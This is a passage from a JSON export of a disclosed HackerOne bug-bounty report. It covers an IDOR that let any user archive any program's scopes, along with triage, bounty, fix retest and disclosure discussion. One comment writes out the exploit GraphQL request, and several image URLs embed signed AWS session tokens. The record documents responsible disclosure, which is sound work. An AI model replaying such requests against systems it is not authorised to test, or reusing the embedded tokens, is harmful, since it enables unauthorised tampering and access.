+            "updated_at": "2022-03-14T14:56:38.224Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15876249,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I am able to confirm that I am able to do the following:\n- Invite another user to that report\n - In another browser login as the invited user\n- archive the program scope as the second user",
+            "automated_response": false,
+            "created_at": "2022-03-14T15:18:29.525Z",
+            "updated_at": "2022-03-14T15:18:29.525Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15883589,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @ahacker1,\n\nPlease provide a video PoC showing that you are able to Archive a program (in Hackerone sandbox environment) and that the scope gets archived for **all other users** as well. \n\nFrom what I can see, other users will see the scope as it is and it does not get archived for them.\n\nThank you and have a great day!\n\nKind regards,\n@cool_wave",
+            "automated_response": false,
+            "created_at": "2022-03-15T03:02:37.474Z",
+            "updated_at": "2022-03-15T03:02:37.474Z",
+            "actor": {
+                "username": "h1_analyst_grace",
+                "cleared": false,
+                "verified": false,
+                "url": "/h1_analyst_grace",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/r2xlydcui5w3ttamd7hq3kclygla/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22wave2.jpg%22%3B%20filename%2A%3DUTF-8%27%27wave2.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070217Z&X-Amz-Expires=1199&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bb863b07ac4153c17514403df7a9ac79e1736fe0acf153ec43894922fc0dd0d8"
+                },
+                "hackerone_triager": true,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15894907,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I have attached an Mp4 PoC. Since an invited user from a report cannot see the scopes of the program, only the owner of the program can see that the scope has been archived. In the Mp4 PoC, the one sending the requests is not the owner's account.\nBecause the invited user cannot see the scopes of the program, it is better if you tried to verify the vulnerability. To do so, you can try sending the following request: \nThe AUTHTOKEN can be obtained by visiting: https://hackerone.com/current_user/graphql_token.json\n```\nPOST /graphql HTTP/2\nHost: hackerone.com\nContent-Length: 388\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"\nAccept: */*\nX-Auth-Token: AUTHTOKEN\nContent-Type: application/json\nOrigin: https://hackerone.com\nReferer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\n\n{\"operationName\":\"ArchiveScope\",\"variables\":{\"structured_scope_id\":\"STRUCTURED SCOPE ID\"},\"query\":\"mutation ArchiveScope($structured_scope_id: ID!) {\\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\\n    was_successful\\n    structured_scope {\\n      id\\n      archived_at\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\n█████",
+            "automated_response": false,
+            "created_at": "2022-03-15T15:59:29.368Z",
+            "updated_at": "2022-04-18T18:17:51.354Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15913267,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugReopened",
+            "message": "Hi @ahacker1 - thanks for your persistence here and apologies for the miscommunication. The same vulnerability was uncovered during a penetration test that we conducted for hackerone.com and then realized that you had already submitted this report. We're reopening and triaging this report. We'll add the hackers that submitted the other report too. Thanks, this was a great find!",
+            "automated_response": false,
+            "created_at": "2022-03-16T19:02:01.871Z",
+            "updated_at": "2022-03-16T19:02:01.871Z",
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15913273,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-03-16T19:02:31.634Z",
+            "updated_at": "2022-03-16T19:02:31.634Z",
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15913279,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Thanks again for bringing to our attention, it's much appreciated!",
+            "automated_response": false,
+            "created_at": "2022-03-16T19:02:50.377Z",
+            "updated_at": "2022-03-16T19:02:50.377Z",
+            "actor": {
+                "url": "/security",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "HackerOne"
+                }
+            },
+            "bounty_amount": "12500.0",
+            "bonus_amount": "0.0",
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "security",
+            "collaborator": {
+                "username": "ahacker1",
+                "url": "/ahacker1"
+            }
+        },
+        {
+            "id": 15913311,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-03-16T19:05:28.915Z",
+            "updated_at": "2022-03-16T19:05:28.915Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 1514191
+            },
+            "actor": {
+                "username": "whhackersbr",
+                "cleared": true,
+                "verified": true,
+                "url": "/whhackersbr",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15913337,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-03-16T19:08:03.582Z",
+            "updated_at": "2022-03-16T19:08:03.582Z",
+            "actor": {
+                "username": "muon4",
+                "cleared": true,
+                "verified": true,
+                "url": "/muon4",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/qnaqvuyajxqzh6ms6m1hih7hedxw/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22Screenshot%202021-08-31%20at%2015.57.16.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot%25202021-08-31%2520at%252015.57.16.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070217Z&X-Amz-Expires=1199&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d3ed03eb3672aeb47342873d4329627f0110de4714a5935f4cb88a0f4a3434aa"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15913351,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks,\nI appreciate the generous bounty!",
+            "automated_response": false,
+            "created_at": "2022-03-16T19:09:41.985Z",
+            "updated_at": "2022-03-16T19:09:41.985Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15914922,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugRetesting",
+            "message": "Hi @ahacker1 - thanks again for this great find! We just pushed a fix for the vulnerability. Would you mind retesting the vulnerability? Thanks!",
+            "automated_response": false,
+            "created_at": "2022-03-17T00:34:36.916Z",
+            "updated_at": "2022-03-17T00:34:37.162Z",
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15914992,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::UserCompletedRetest",
+            "message": "I tested the vulnerability by sending the same request used in the vulnerability.\nI received the following response instead and the scope of the other program was not archived:\n```\n{\n    \"data\": {\n        \"archiveStructuredScope\": {\n            \"was_successful\": false,\n            \"structured_scope\": null,\n            \"__typename\": \"ArchiveStructuredScopePayload\"\n        }\n    }\n}\n```",
+            "automated_response": false,
+            "created_at": "2022-03-17T01:06:13.191Z",
+            "updated_at": "2022-03-17T01:06:13.191Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15915153,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportRetestApproved",
+            "message": null,
+            "automated_response": false,
+            "created_at": "2022-03-17T02:20:09.039Z",
+            "updated_at": "2022-03-17T02:20:09.039Z",
+            "actor": {
+                "url": "/security",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "HackerOne"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15915154,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-03-17T02:20:09.175Z",
+            "updated_at": "2022-03-17T02:20:09.175Z",
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "reporter": {
+                "username": "ahacker1",
+                "url": "/ahacker1"
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 15915433,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-03-17T03:44:49.290Z",
+            "updated_at": "2022-03-17T03:44:49.290Z",
+            "actor": {
+                "username": "dkd",
+                "cleared": true,
+                "verified": true,
+                "url": "/dkd",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16015868,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Please use limited disclosure for this report! Thanks!",
+            "automated_response": false,
+            "created_at": "2022-03-24T19:59:13.661Z",
+            "updated_at": "2022-03-24T19:59:13.661Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16101449,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::CancelledDisclosureRequest",
+            "message": " ‎",
+            "automated_response": false,
+            "created_at": "2022-04-01T02:20:25.996Z",
+            "updated_at": "2022-04-01T02:20:25.996Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16203128,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-04-08T02:13:49.027Z",
+            "updated_at": "2022-04-08T02:13:49.027Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16203129,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Please use limited disclosure for this report! Thanks!\n",
+            "automated_response": false,
+            "created_at": "2022-04-08T02:14:14.027Z",
+            "updated_at": "2022-04-08T02:14:14.027Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16336622,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@ahacker1 Any particular reason you wouldn't want this to be fully disclosed? As per our policy, every report gets fully disclosed unless there's a good reason not to. Let me know!",
+            "automated_response": false,
+            "created_at": "2022-04-18T18:08:15.370Z",
+            "updated_at": "2022-04-18T18:08:15.370Z",
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16336656,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Full disclosure is also fine as long as all attachments are redacted. Thanks!",
+            "automated_response": false,
+            "created_at": "2022-04-18T18:11:48.803Z",
+            "updated_at": "2022-04-18T18:11:48.803Z",
+            "actor": {
+                "username": "ahacker1",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahacker1",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16336758,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "@ahacker1 Ah, yes, that makes perfect sense! I've redacted the attachments and an auth token. Thanks again for bringing this to our attention.\n\nAs part of our incident response process, we determined that this vulnerability was not exploited by anyone other than the penetration testers and @ahacker1. All finders responsibly disclosed the vulnerability to HackerOne and the vulnerability was only exploited it for demonstration purposes.",
+            "automated_response": false,
+            "created_at": "2022-04-18T18:22:22.607Z",
+            "updated_at": "2022-04-18T18:22:22.607Z",
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16336759,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-04-18T18:22:22.929Z",
+            "updated_at": "2022-04-18T18:22:22.929Z",
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        },
+        {
+            "id": 16336764,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportTitleUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2022-04-18T18:23:06.139Z",
+            "updated_at": "2022-04-18T18:23:06.139Z",
+            "additional_data": {
+                "old_title": "Archive Any Scope of a Program",
+                "new_title": "An attacker can archive and unarchive any structured scope object on HackerOne"
+            },
+            "actor": {
+                "username": "jobert",
+                "cleared": true,
+                "verified": true,
+                "url": "/jobert",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": true
+            },
+            "genius_execution_id": null,
+            "team_handle": "security"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "id": 145138,
+            "category": "team",
+            "content": "@ahacker1 found an Insecure Direct Object Reference (IDOR) vulnerability that allowed anyone to archive and unarchive an asset on HackerOne.com. This wasn't an easy vulnerability to spot: when exploited, the system would return an error indicating that the object wasn't found. However, the asset would still be archived or unarchived. We want to thank @ahacker1 for their persistence and disclosing the security vulnerability to us!\n\n**A note on the triage experience**: this was a poor triage experience for the reporter. Although the security analyst followed up after each comment from the reporter, they were unable to reproduce the described vulnerability. The hacker, rightfully so, was persistent that they had found a security vulnerability. \n\nWe're taking steps to improve this. Specifically, HackerOne's security operations team has taken feedback from the engineering team about which questions to ask in the future that will help determine the legitimacy of a security vulnerability faster. Reports will also be assigned to the HackerOne engineering team faster. We are exploring how to roll out these triage changes to other customers. Lastly, HackerOne's engineering team also added a number of asset IDs to [our policy](https://hackerone.com/security/policy_versions?type=team&change=3669996) to help reproduce similar vulnerabilities. We aim to continuously expand this list of known identifiers for hackers to proof security vulnerabilities in production.\n\nThat said, we'd be remiss if we didn't acknowledge that this vulnerability was hard to understand. When exploited, the video proof of concept showed a 404 page not found error and did not clearly demonstrate switching between different users or a program that the attacker didn't have access to.",
+            "user": {
+                "id": 2,
+                "username": "jobert",
+                "name": "Jobert Abma",
+                "bio": "Co-founder of HackerOne. ಠ_ಠ",
+                "cleared": true,
+                "verified": true,
+                "website": "https://hackerone.com",
+                "location": "San Francisco, CA",
+                "created_at": "2013-03-08T01:17:12.256Z",
+                "url": "https://hackerone.com/jobert",
+                "hackerone_triager": false,
+                "hackerone_employee": true,
+                "user_type": "company",
+                "profile_picture_urls": {
+                    "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+                    "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        },
+        {
+            "id": 139058,
+            "category": "researcher",
+            "content": "An IDOR (Insecure direct object reference) vulnerability allowed the assets/structured scopes of any program to be archived.",
+            "user": {
+                "id": 2140422,
+                "username": "ahacker1",
+                "name": "ahacker1",
+                "bio": ".",
+                "cleared": false,
+                "verified": false,
+                "website": null,
+                "location": "",
+                "created_at": "2021-12-23T19:01:55.071Z",
+                "url": "https://hackerone.com/ahacker1",
+                "hackerone_triager": false,
+                "hackerone_employee": false,
